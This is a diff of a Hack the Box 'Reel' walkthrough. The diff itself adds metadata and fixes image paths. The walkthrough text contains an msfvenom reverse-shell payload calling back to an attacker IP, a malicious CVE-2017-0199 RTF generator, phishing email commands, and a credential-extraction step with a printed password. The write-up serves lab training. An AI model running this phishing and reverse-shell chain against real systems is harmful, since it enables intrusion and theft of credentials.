@@ -2,10 +2,12 @@
 title: "Hack the Box - Reel"
 slug: "hack-the-box-reel"
 date: "2024-03-14"
-excerpt: ""
+excerpt: "Reel is a hard difficulty Windows machine that starts with a phishing attack: a malicious RTF file is emailed to a user to exploit CVE-2017-0199 and gain a foothold as `nico`. Stored credentials lead to lateral movement to `tom`, and BloodHound reveals an Active Directory ACL path that is abused to escalate to the domain administrator."
 cover: "cover.png"
 tags:
-  - 
+  - Phishing
+  - CVE-2017-0199
+  - BloodHound
 ---
 
 ## Summary
@@ -127,11 +129,11 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ### FTP
 We have anonymous FTP access.
 
-![](evidence/screenshots/20220812150318524.png)
+![](./20220812150318524.png)
 
 There are some files in the `documents` directory. Let's download them.
 
-![](evidence/screenshots/20220812150443242.png)
+![](./20220812150443242.png)
 
 If we look at the the properties of the file we can see the username of the creator of the file.
 
@@ -139,13 +141,13 @@ If we look at the the properties of the file we can see the username of the crea
 exiftool * | grep Creator
 ```
 
-![](evidence/screenshots/20220812150733492.png)
+![](./20220812150733492.png)
 
 ### Malicious RTF File
 
 If we look at the `readme.txt` file, it says that files sent via email will be converted. So we need to figure out a way to execute a malicious payload in RTF files as well as figure out how to email it.
 
-![](evidence/screenshots/20220812150844002.png)
+![](./20220812150844002.png)
 
 In order to create a malicious RTF document we first need to create a payload.
 
@@ -153,7 +155,7 @@ In order to create a malicious RTF document we first need to create a payload.
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.7 LPORT=9001 -f hta-psh -o shell.hta
 ```
 
-![](evidence/screenshots/20220812202643681.png)
+![](./20220812202643681.png)
 
 We also need to download a script to generate our malicious document.
 
@@ -167,7 +169,7 @@ Then create the malicious document pointing the remote URL to our machine.
 python cve-2017-0199_toolkit.py -M gen -w document.rtf -u http://10.10.16.7/shell.hta -t rtf -x 0
 ```
 
-![](evidence/screenshots/20220812202749267.png)
+![](./20220812202749267.png)
 
 ### SMTP
 Now that we've generated the malicious file, we need to send it via email. We need to figure out some valid email addresses we can use to send the email from.
@@ -185,7 +187,7 @@ nico@megabank.com
 smtp-user-enum -M RCPT -U emails.txt -t reel.htb
 ```
 
-![](evidence/screenshots/20220812210651284.png)
+![](./20220812210651284.png)
 
 It looks like we can use anything with `@reel.htb`. Now we can use `sendemail` to send an email to `nico@megabank.com`.
 
@@ -203,24 +205,24 @@ Then send we can the email with our RTF document as an attachment.
 sendemail -f test@reel.htb -t nico@megabank.com -u "Sign Document" -m "Please sign attatched document." -a document.rtf -s reel.htb -v
 ```
 
-![](evidence/screenshots/20220812211005525.png)
+![](./20220812211005525.png)
 
 And we get a our shell!
 
-![](evidence/screenshots/20220812211101705.png)
+![](./20220812211101705.png)
 
 ### User.txt
 ```bash
 type user.txt && ipconfig
 ```
 
-![](evidence/screenshots/20220812211249337.png)
+![](./20220812211249337.png)
 
 ## Pivot to Tom
 ### Network Credentials
 On the Desktop of `nico` is a document named `cred.xml`.
 
-![](evidence/screenshots/20220812211439040.png)
+![](./20220812211439040.png)
 
 It looks like it contains an a PowerShell credential object exported as XML. We can import it and get the plaintext credentials using `ImportClixml`.
 
@@ -228,7 +230,7 @@ It looks like it contains an a PowerShell credential object exported as XML. We 
 powershell -c "$cred = Import-Clixml cred.xml; $cred.GetNetworkCredential() | Select-Object *"
 ```
 
-![](evidence/screenshots/20220812220312002.png)
+![](./20220812220312002.png)
 
 ```text
 tom:1ts-mag1c!!!
@@ -240,42 +242,7 @@ Now we're able to SSH in.
 ssh tom@reel.htb
 ```
 
-![](evidence/screenshots/20220812220417547.png)
+![](./20220812220417547.png)
 
 ## Privilege Escalation
-On Tom's desktop is a directory `AD Audit\Bloodhound\Ingestors`. Inside is a `acls.csv` file.# reel
-## Summary
-### System Information
-```text
-IP: 
-OS: 
-Hostname: 
-```
-
-### Credentials
-```text
-
-```
-
-### Hashes
-```text
-
-```
-
-### Ports
-```text
-
-```
-
-***
-
-## Enumeration
-### NMAP
-
-```bash
-
-```
-
-```text
-
-```
+On Tom's desktop is a directory `AD Audit\Bloodhound\Ingestors`. Inside is a `acls.csv` file.
